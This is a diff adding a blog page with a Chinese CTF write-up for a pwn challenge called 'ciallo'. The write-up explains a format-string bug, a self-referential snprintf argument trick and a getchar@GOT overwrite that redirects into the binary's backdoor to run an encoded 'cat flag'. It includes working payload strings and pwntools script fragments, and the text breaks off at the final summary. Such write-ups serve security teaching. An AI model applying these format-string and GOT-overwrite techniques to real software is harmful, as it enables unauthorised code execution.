@@ -1,0 +1,889 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Ciallo WP这题是我做过的最好玩的题目，Ciallo～(∠·ω&lt; )⌒★题目是超级好玩的剧情题，最后藏了个 fmt。 附件：  pwn libc.so.6 ld-linux-x86-64.so.2  保护： 123456789[*] &#x27;&#x2F;mnt&#x2F;c&#x2F;Users&#x2F;23872&#x2F;Desktop&#x2F;pwn&#x2F;26_04_25&#x2F;ciallo&#x2F;pwn&#x27;    Arch:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0psu3线下赛-ciallo_wp">
+<meta property="og:url" content="http://example.com/2026/04/25/0psu3%E7%BA%BF%E4%B8%8B%E8%B5%9B-ciallo_wp/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Ciallo WP这题是我做过的最好玩的题目，Ciallo～(∠·ω&lt; )⌒★题目是超级好玩的剧情题，最后藏了个 fmt。 附件：  pwn libc.so.6 ld-linux-x86-64.so.2  保护： 123456789[*] &#x27;&#x2F;mnt&#x2F;c&#x2F;Users&#x2F;23872&#x2F;Desktop&#x2F;pwn&#x2F;26_04_25&#x2F;ciallo&#x2F;pwn&#x27;    Arch:">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-04-25T14:17:14.000Z">
+<meta property="article:modified_time" content="2026-04-25T14:17:14.550Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>0psu3线下赛-ciallo_wp - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>poorjack&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>Search</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="Light"
+               data-label-dark="Dark">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">Dark</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="0psu3线下赛-ciallo_wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-25 22:17" pubdate>
+          April 25, 2026 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.5k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          38 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">0psu3线下赛-ciallo_wp</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    Last updated on April 25, 2026 pm
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Ciallo-WP"><a href="#Ciallo-WP" class="headerlink" title="Ciallo WP"></a>Ciallo WP</h1><p>这题是我做过的最好玩的题目，Ciallo～(∠·ω&lt; )⌒★<br>题目是超<del>级</del>好<del>玩</del>的剧情题，最后藏了个 fmt。</p>
+<p>附件：</p>
+<ul>
+<li>pwn</li>
+<li>libc.so.6</li>
+<li>ld-linux-x86-64.so.2</li>
+</ul>
+<p>保护：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/mnt/c/Users/23872/Desktop/pwn/26_04_25/ciallo/pwn&#x27;</span><br>    <span class="hljs-attr">Arch:</span>       <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>      <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x3fe000)</span><br>    <span class="hljs-attr">SHSTK:</span>      <span class="hljs-string">Enabled</span><br>    <span class="hljs-attr">IBT:</span>        <span class="hljs-string">Enabled</span><br>    <span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br></code></pre></td></tr></table></figure>
+
+<p>所以第一眼其实会想到两件事：</p>
+<ol>
+<li>有 fmt，大概率能写</li>
+<li>但是开了 CET，直接改返回地址多半不好使</li>
+</ol>
+<p>最后事实也差不多就是这样。</p>
+<h2 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h2><p>程序启动以后会先吐 128 字节东西出来，参考ida得知是异或 key。<br>后面所有剧情输出都不是明文，而是跟这个 key 异或以后按 128 字节块发出来的。<br>所以脚本如果不先把这个 key 收下来，后面基本没法正常跟剧情。</p>
+<p>主流程没啥特别的，就是名字 + 7 次选项。<br>只有走到 Good End，最后“告白”那个输入点才会进漏洞函数。</p>
+<p>我这边在 IDA 里主要看的函数是：(这道题的ida函数名其实降低了很多难度，扒掉符号表会很疯狂:P)</p>
+<ul>
+<li><code>main</code></li>
+<li><code>offer_format_string_chance</code></li>
+<li><code>insecure_player_echo</code></li>
+<li><code>hidden_backdoor_system</code></li>
+<li><code>decrypt_backdoor_command</code></li>
+<li><code>backdoor_key_byte</code></li>
+</ul>
+<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>最终会到这个函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">offer_format_string_chance</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x100</span>];<br>    ...<br>    read_line(buf, <span class="hljs-number">257</span>);<br>    secure_puts(g_text_confession_open);<br>    insecure_player_echo(buf);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>继续跟进 <code>insecure_player_echo()</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">insecure_player_echo</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s));<br>    <span class="hljs-built_in">snprintf</span>(s, <span class="hljs-number">0x1000u</span>, buf);<br>    secure_write_plain(s);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>问题就在这句：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">snprintf</span>(s, <span class="hljs-number">0x1000u</span>, buf);<br></code></pre></td></tr></table></figure>
+
+<p>用户输入直接当 format string 了，没传额外参数，标准 fmt 漏洞。</p>
+<h2 id="为什么不打返回地址"><a href="#为什么不打返回地址" class="headerlink" title="为什么不打返回地址"></a>为什么不打返回地址</h2><p>最开始我也想过，直接把 saved RIP 改到后门函数不就完了。<br>但这题 SHSTK &#x2F; IBT 都开着，实测这种打法非常不稳定，各种 crash。</p>
+<p>所以后面我就没再纠结 ret 了，直接换思路打 GOT。<br>这题因为是 Partial RELRO，GOT 还能写，这就舒服很多。</p>
+<h2 id="解密输出"><a href="#解密输出" class="headerlink" title="解密输出"></a>解密输出</h2><p>程序一开始会先输出 128 字节 key。<br>后面每次输出 128 字节密文，解密方式很简单：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">dec</span>(<span class="hljs-params">blk, key</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(c ^ key[i] <span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(blk)).split(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure>
+
+<p>这里 <code>split(b&#39;\x00&#39;, 1)[0]</code> 是因为原字符串按 <code>\0</code> 截断。</p>
+<p>总之脚本逻辑就是：</p>
+<ol>
+<li>先 <code>recvn(128)</code> 拿 key</li>
+<li>后面每次再收 128 字节块</li>
+<li>自己 xor 回去</li>
+</ol>
+<p>不然就没法玩有趣的 旮 旯 给 木。</p>
+<h2 id="后门函数"><a href="#后门函数" class="headerlink" title="后门函数"></a>后门函数</h2><p>后门函数 <code>hidden_backdoor_system()</code> 长这样：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">hidden_backdoor_system</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> command[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x200</span>];<br>    read_line(buf, <span class="hljs-number">513</span>);<br>    <span class="hljs-keyword">if</span> ( decrypt_backdoor_command(buf, command, <span class="hljs-number">0x100u</span>) ) &#123;<br>        fflush(<span class="hljs-number">0</span>);<br>        system(command);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>意思就是：<br>如果能把流程劫持到这里，后面它会再读一行，然后解密，再 <code>system(command)</code>。</p>
+<p>但这里有个坑：<br>第二次输入不能直接发 <code>cat flag</code>，因为它会先跑 <code>decrypt_backdoor_command()</code>。<br>也就是说你得按它自己的方式把命令编码好再发过去。</p>
+<h2 id="后门命令怎么编码"><a href="#后门命令怎么编码" class="headerlink" title="后门命令怎么编码"></a>后门命令怎么编码</h2><p>这里我没走捷径，直接把 <code>backdoor_key_byte()</code> 那套逻辑抄出来了。<br>本质上就是：</p>
+<ul>
+<li>先根据启动时那 128 字节 key 派生一个循环 key</li>
+<li>再把命令逐字节异或</li>
+<li>最后转成 hex 发进去</li>
+</ul>
+<p>我脚本里用的是：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rotl8</span>(<span class="hljs-params">x, n</span>):<br>    x &amp;= <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> ((x &lt;&lt; n) | (x &gt;&gt; (<span class="hljs-number">8</span> - n))) &amp; <span class="hljs-number">0xff</span> <span class="hljs-keyword">if</span> n <span class="hljs-keyword">else</span> x<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">kbyte</span>(<span class="hljs-params">key, i</span>):<br>    a = key[(<span class="hljs-number">11</span> * i + <span class="hljs-number">17</span>) &amp; <span class="hljs-number">0x7f</span>]<br>    b = key[(<span class="hljs-number">13</span> * i + <span class="hljs-number">29</span>) &amp; <span class="hljs-number">0x7f</span>]<br>    c = key[(<span class="hljs-number">7</span> * i + <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0x7f</span>] ^ ((<span class="hljs-number">61</span> * i + <span class="hljs-number">39</span>) &amp; <span class="hljs-number">0xff</span>)<br>    <span class="hljs-keyword">return</span> ((a + <span class="hljs-number">65</span>) ^ rotl8(c, i &amp; <span class="hljs-number">7</span>) ^ (b &gt;&gt; (i % <span class="hljs-number">3</span> + <span class="hljs-number">1</span>))) &amp; <span class="hljs-number">0xff</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc_cmd</span>(<span class="hljs-params">key, s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(ch ^ kbyte(key, i) <span class="hljs-keyword">for</span> i, ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(s)).<span class="hljs-built_in">hex</span>().encode()<br></code></pre></td></tr></table></figure>
+
+<p>第二阶段直接这样就行：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">enc_cmd(key, <span class="hljs-string">b&#x27;cat flag&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="self-referential-snprintf"><a href="#self-referential-snprintf" class="headerlink" title="self-referential snprintf"></a>self-referential snprintf</h2><p>这题真正有意思的是fmt。<br>因为调用是：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">snprintf</span>(dst, <span class="hljs-number">0x1000</span>, user_input)<br></code></pre></td></tr></table></figure>
+
+<p>而且 <code>dst</code> 在调用前被 <code>memset(..., 0)</code> 清零了。</p>
+<p>这时候虽然没传 varargs，但 <code>snprintf</code> 还是会按 ABI 去“取参数”。<br>我调的时候发现一个很怪但很关键的现象：</p>
+<ul>
+<li>前几个 <code>%p</code> 大多是 <code>(nil)</code> 或者一些栈值</li>
+<li>再往后会读到 <code>dst</code> 里已经写进去的内容</li>
+</ul>
+<p>比如拿这个测试：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;ABCDEFGH%p%p%p%p%p%p&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>后面会看到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">0x4847464544434241<br></code></pre></td></tr></table></figure>
+
+<p>也就是 <code>ABCDEFGH</code> 的小端。</p>
+<p>这说明一件事：<br><code>arg6</code> 实际上就是 <code>dst[0:8]</code> 这 8 个字节拼出来的 qword。</p>
+<p>这点很关键，因为 <code>dst</code> 先被清零了。<br>所以如果我只在 payload 前面放目标地址的前几个非零字节，后面高字节天然就是 0。<br>这样就能在<strong>不直接输入 NUL</strong> 的情况下，构造一个合法指针参数。</p>
+<h2 id="为什么选-getchar-GOT"><a href="#为什么选-getchar-GOT" class="headerlink" title="为什么选 getchar@GOT"></a>为什么选 getchar@GOT</h2><p>因为最后程序一定会走到：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">secure_puts(g_text_exit_prompt);<br>getchar();<br></code></pre></td></tr></table></figure>
+
+<p>所以思路就很自然：<br>把 <code>getchar@GOT</code> 改成 <code>hidden_backdoor_system</code>。</p>
+<p>这样整个流程就变成：</p>
+<ol>
+<li>在最后的 fmt 点改 GOT</li>
+<li>程序照常往后跑</li>
+<li>跑到 <code>getchar()</code> 的时候，实际上进后门</li>
+<li>这时候再发编码后的命令</li>
+<li>后门解出来以后 <code>system(command)</code></li>
+</ol>
+<p>这个打法比打返回地址稳定太多，尤其是 CET 在的时候。</p>
+<h2 id="payload-怎么构造"><a href="#payload-怎么构造" class="headerlink" title="payload 怎么构造"></a>payload 怎么构造</h2><p>目标地址我这边分析到的是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">getchar@GOT = 0x405058<br>hidden_backdoor_system = 0x401aad<br></code></pre></td></tr></table></figure>
+
+<p>其实只要把 GOT 低两字节改成 <code>0x1aad</code> 就够了。</p>
+<h3 id="第一步：让-arg6-变成-0x405058"><a href="#第一步：让-arg6-变成-0x405058" class="headerlink" title="第一步：让 arg6 变成 0x405058"></a>第一步：让 arg6 变成 0x405058</h3><p>小端：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">0x405058 -&gt; 58 50 40 00 00 00 00 00<br></code></pre></td></tr></table></figure>
+
+<p>只有前三个字节非零。</p>
+<p>因为 <code>dst</code> 一开始是全 0，所以 payload 开头只要放：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p64(<span class="hljs-number">0x405058</span>)[:<span class="hljs-number">3</span>] == <span class="hljs-string">b&#x27;\x58\x50\x40&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>那么 <code>dst[0:8]</code> 实际就是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">58 50 40 00 00 00 00 00<br></code></pre></td></tr></table></figure>
+
+<p>也就是 <code>arg6 = 0x405058</code>。</p>
+<h3 id="第二步：用-6-hn-写两字节"><a href="#第二步：用-6-hn-写两字节" class="headerlink" title="第二步：用 %6$hn 写两字节"></a>第二步：用 %6$hn 写两字节</h3><p>目标值：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">0x401aad &amp; 0xffff = 0x1aad = 6829<br></code></pre></td></tr></table></figure>
+
+<p>但是别忘了，前缀 <code>\x58\x50\x40</code> 已经先输出了 3 个字符。<br>所以真正还需要补：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">6829 - 3 = 6826<br></code></pre></td></tr></table></figure>
+
+<p>最终 payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">pay = <span class="hljs-string">b&#x27;\x58\x50\x40%1$6826c%6$hn&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>这里我特地全都写成 positional：</p>
+<ul>
+<li><code>%1$6826c</code></li>
+<li><code>%6$hn</code></li>
+</ul>
+<p>这个地方别混着写，混用 positional &#x2F; non-positional 在这题里很容易把 glibc 干崩。</p>
+<h2 id="交互顺序"><a href="#交互顺序" class="headerlink" title="交互顺序"></a>交互顺序</h2><p>这题交互上也别急。<br>不是 fmt 一打完就马上发后门命令，而是分两段。</p>
+<h3 id="先走剧情拿到-Good-End"><a href="#先走剧情拿到-Good-End" class="headerlink" title="先走剧情拿到 Good End"></a>先走剧情拿到 Good End</h3><p>我这边跑通的选项是：</p>
+<ul>
+<li>名字：<code>cat flag</code></li>
+<li>七次选项：<code>1 1 2 3 2 1 1</code></li>
+</ul>
+<p>这样能进 Good End。</p>
+<h3 id="到“把想说的话告诉她”时发-fmt-payload"><a href="#到“把想说的话告诉她”时发-fmt-payload" class="headerlink" title="到“把想说的话告诉她”时发 fmt payload"></a>到“把想说的话告诉她”时发 fmt payload</h3><p>看到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">把想说的话告诉她：<br></code></pre></td></tr></table></figure>
+
+<p>发：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;\x58\x50\x40%1$6826c%6$hn&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>这一步只是把 <code>getchar@GOT</code> 改成后门。</p>
+<h3 id="等到最后“按回车键离开”再发后门命令"><a href="#等到最后“按回车键离开”再发后门命令" class="headerlink" title="等到最后“按回车键离开”再发后门命令"></a>等到最后“按回车键离开”再发后门命令</h3><p>看到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">按回车键离开。<br></code></pre></td></tr></table></figure>
+
+<p>这时候程序接下来本来是 <code>getchar()</code>，但 GOT 已经被改了，所以会直接跳进 <code>hidden_backdoor_system()</code>。</p>
+<p>然后再发：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">enc_cmd(key, <span class="hljs-string">b&#x27;cat flag&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>就会执行：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">system(<span class="hljs-string">&quot;cat flag&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<h2 id="核心-exp"><a href="#核心-exp" class="headerlink" title="核心 exp"></a>核心 exp</h2><p>完整脚本在 <code>e.py</code>。</p>
+<p>最核心其实就两段：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">pay = p64(GETCHAR_GOT)[:<span class="hljs-number">3</span>]<br>pay += <span class="hljs-string">f&#x27;%1$<span class="hljs-subst">&#123;(BACKDOOR &amp; <span class="hljs-number">0xffff</span>) - <span class="hljs-built_in">len</span>(pay)&#125;</span>c%6$hn&#x27;</span>.encode()<br></code></pre></td></tr></table></figure>
+
+<p>以及根据剧情提示切换发送内容：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;把想说的话告诉她&#x27;</span> <span class="hljs-keyword">in</span> msg:<br>    io.sendline(pay)<br><span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;按回车键离开&#x27;</span> <span class="hljs-keyword">in</span> msg:<br>    io.sendline(enc_cmd(key, cmd))<br>    <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这题表面看是个剧情题，实际核心就三点：</p>
+<ol>
+<li>只有 Good End 才会进最后那个 fmt 点</li>
+<li><code>snprintf(dst, ..., user)</code> + <code>dst</code> 预先清零，能做出 self-referential 参数</li>
+<li>CET 环境下别硬打 ret，改 <code>getchar@GOT</code> 进后门最稳</li>
+</ol>
+<p>最后利用链就是：</p>
